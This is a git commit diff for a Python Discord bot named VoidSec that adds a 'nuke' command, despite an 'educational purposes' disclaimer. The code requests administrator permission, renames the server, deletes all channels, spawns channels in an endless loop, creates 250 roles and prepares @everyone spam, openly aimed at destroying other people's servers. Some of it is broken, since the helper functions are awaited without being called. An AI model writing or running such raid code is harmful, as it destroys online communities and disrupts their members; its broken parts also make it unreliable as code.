61c481c0608d9514d8acd4f40832efe97b9fc302
〖ЖƬ𝝙〗Ξɧєяя ➠VσιɖᏕє¢ᴸˣˣᴵ ! 〚Я₭₴〛 <s.olarcorps4@gmail.com>
2024-10-17 19:15:00 +0300

    Update main.py
    added nuke command

--- main.py
+++ main.py
@@ -1,5 +1,6 @@
 """
 this is just for educational purposes !!!
+also if youre gonna use this give creds
 """
 
 import discord
@@ -7,11 +8,12 @@ from discord.ext import commands
 import asyncio
 import aiohttp # prob wont use this but just in case
 from itertools import cycle
+from colorama import Fore
 
 with open("C:/Users/Administrator/Downloads/voidsec.png", "rb") as file: # replace this with your own file path
   servicon = file.read()
 
-penny = "token here"
+penny = "token here real"
 
 msgcum = ["@everyone yeah idk"]
 # add , after " to add more messagess
@@ -23,4 +25,63 @@ rolename = channels
 
 webhooknames = channels
 
-voidsec = commands.Bot(command_prefix="v!", intents=discord.Intents.all())
+prefix = "v!" # doesnt have to be a var but i prefer it like this
+
+voidsec = commands.Bot(command_prefix=prefix, intents=discord.Intents.all())
+
+@voidsec.event
+async def on_ready():
+    print(Fore.RED + f"""
+██████╗ ███████╗███████╗████████╗██████╗  ██████╗ ██╗   ██╗███████╗██████╗ 
+██╔══██╗██╔════╝██╔════╝╚══██╔══╝██╔══██╗██╔═══██╗╚██╗ ██╔╝██╔════╝██╔══██╗
+██║  ██║█████╗  ███████╗   ██║   ██████╔╝██║   ██║ ╚████╔╝ █████╗  ██████╔╝
+██║  ██║██╔══╝  ╚════██║   ██║   ██╔══██╗██║   ██║  ╚██╔╝  ██╔══╝  ██╔══██╗
+██████╔╝███████╗███████║   ██║   ██║  ██║╚██████╔╝   ██║   ███████╗██║  ██║
+╚═════╝ ╚══════╝╚══════╝   ╚═╝   ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚══════╝╚═╝  ╚═╝
+{Fore.YELLOW}[i] Destroyer: Ready to destroy some Gachas.
+{Fore.YELLOW}[i] Username: {voidsec.user}
+{Fore.YELLOW}[i] User ID: {voidsec.user.id}
+{Fore.YELLOW}[i] Selfbot: False
+{Fore.YELLOW}[i] Bot: True
+{Fore.YELLOW}[i] Prefix: {prefix}
+{Fore.YELLOW}[i] Creator: VoidSec
+{Fore.YELLOW}[i] Help: Type v!help for a list of commands.
+{Fore.YELLOW}[i] Invite URL: https://discord.com/oauth2/authorize?client_id={voidsec.user.id}&scope=bot&permissions=8
+""")
+
+async def delchans(ctx):
+    void = ctx.guild
+    for channel in void.channels:
+        try:
+           await channel.delete() # no community handling poop :scream: (im too lazy mb)
+           print(f"{Fore.GREEN}[+] Channel deleted")
+        except:
+            print(f"{Fore.RED}[-] Channel not deleted")
+
+async def createchans(ctx):
+    void = ctx.guild
+    while True:
+      try:
+         await void.create_text_channel(name=next(channels))
+         print(f"{Fore.GREEN}[+] Channel created")
+      except:
+          print(f"{Fore.RED}[-] Channel not created")
+
+async def croles(ctx):
+    void = ctx.guild
+    for i in range(250):
+        try:
+           await void.create_role(name=next(rolename))
+           print(f"{Fore.GREEN}[+] Role created")
+        except:
+            print(f"{Fore.RED}[-] Role not created")
+
+@voidsec.command()
+async def nuke(ctx):
+    void = ctx.guild
+    await void.edit(name=servname, icon=servicon)
+    await delchans
+    await createchans
+    await croles
+
+voidsec.run(penny)
